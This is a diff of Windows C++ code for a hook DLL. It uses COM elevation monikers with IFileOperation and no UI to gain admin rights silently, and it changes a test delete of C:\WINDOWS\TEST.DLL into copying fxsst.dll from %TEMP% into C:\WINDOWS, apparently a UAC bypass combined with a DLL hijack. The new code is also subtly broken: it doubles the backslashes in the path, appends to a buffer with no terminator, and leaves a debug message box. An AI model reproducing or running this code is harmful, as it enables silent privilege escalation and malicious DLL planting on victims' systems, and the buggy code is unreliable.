@@ -23,20 +23,76 @@ HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, void** 
 	return CoGetObject(wszMon, &bo, riid, ppv);
 }
 
-void ElevatedDelete()
+void ElevatedCopy()
 {
-	// This is only availabe on Vista and higher
-	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
-	IFileOperation* pfo;
-	hr = CoCreateInstanceAsAdmin(NULL, CLSID_FileOperation, IID_PPV_ARGS(&pfo));
-	pfo->SetOperationFlags(FOF_NO_UI);
-	IShellItem* item = NULL;
-	hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\TEST.DLL", NULL, IID_PPV_ARGS(&item));
-	pfo->DeleteItem(item, NULL);
-	pfo->PerformOperations();
-	item->Release();
-	pfo->Release();
-	CoUninitialize();
+    // This is only available on Vista and higher
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+    if (FAILED(hr))
+    {
+        return;
+    }
+    IFileOperation* pfo;
+    hr = CoCreateInstanceAsAdmin(NULL, CLSID_FileOperation, IID_PPV_ARGS(&pfo));
+    if (FAILED(hr))
+    {
+        return;
+    }
+    pfo->SetOperationFlags(FOF_NO_UI);
+    IShellItem* from = NULL, * to = NULL;
+    // Get the %TEMP% directory
+    wchar_t szTempDir[MAX_PATH];
+    GetTempPathW(MAX_PATH, szTempDir);
+    // Get the long form of the path
+    wchar_t szLongTempDir[MAX_PATH];
+    GetLongPathNameW(szTempDir, szLongTempDir, MAX_PATH);
+    // Calculate the number of backslashes in the original path
+    int numBackslashes = 0;
+    for (int i = 0; szLongTempDir[i] != '\0'; i++)
+    {
+        if (szLongTempDir[i] == '\\')
+        {
+            numBackslashes++;
+        }
+    }
+    // Calculate the length of the new string
+    size_t len = wcslen(szLongTempDir) + numBackslashes + wcslen(L"\\fxsst.dll") + 1;
+    // Allocate memory for the new string
+    wchar_t* szFxsstDllPath = new wchar_t[len];
+    // Build the full path for the DLL, escaping the backslashes
+    int j = 0;
+    for (int i = 0; szLongTempDir[i] != '\0'; i++)
+    {
+        if (szLongTempDir[i] == '\\')
+        {
+            szFxsstDllPath[j++] = '\\';
+            szFxsstDllPath[j++] = '\\';
+        }
+        else
+        {
+            szFxsstDllPath[j++] = szLongTempDir[i];
+        }
+    }
+    // Append the DLL name
+    wcscat_s(szFxsstDllPath, len, L"\\fxsst.dll");
+    MessageBox(NULL, szFxsstDllPath, L"dll", MB_OK);
+    hr = SHCreateItemFromParsingName(szFxsstDllPath, NULL, IID_PPV_ARGS(&from));
+    if (FAILED(hr))
+    {
+        return;
+    }
+    hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\", NULL, IID_PPV_ARGS(&to));
+    if (FAILED(hr))
+    {
+        return;
+    }
+    pfo->CopyItem(from, to, L"fxsst.dll", NULL);
+    pfo->PerformOperations();
+    from->Release();
+    to->Release();
+    pfo->Release();
+    if(szFxsstDllPath)
+        delete[] szFxsstDllPath;
+    CoUninitialize();
 }
 
 extern "C" __declspec(dllexport) LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -47,7 +103,7 @@ extern "C" __declspec(dllexport) LRESULT CALLBACK CBTProc(int nCode, WPARAM wPar
         TCHAR szModulePath[MAX_PATH];
         GetModuleFileName(hModuleGlobal, szModulePath, MAX_PATH);
         hModuleGlobal = LoadLibrary(szModulePath);
-        ElevatedDelete();
+        ElevatedCopy();
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
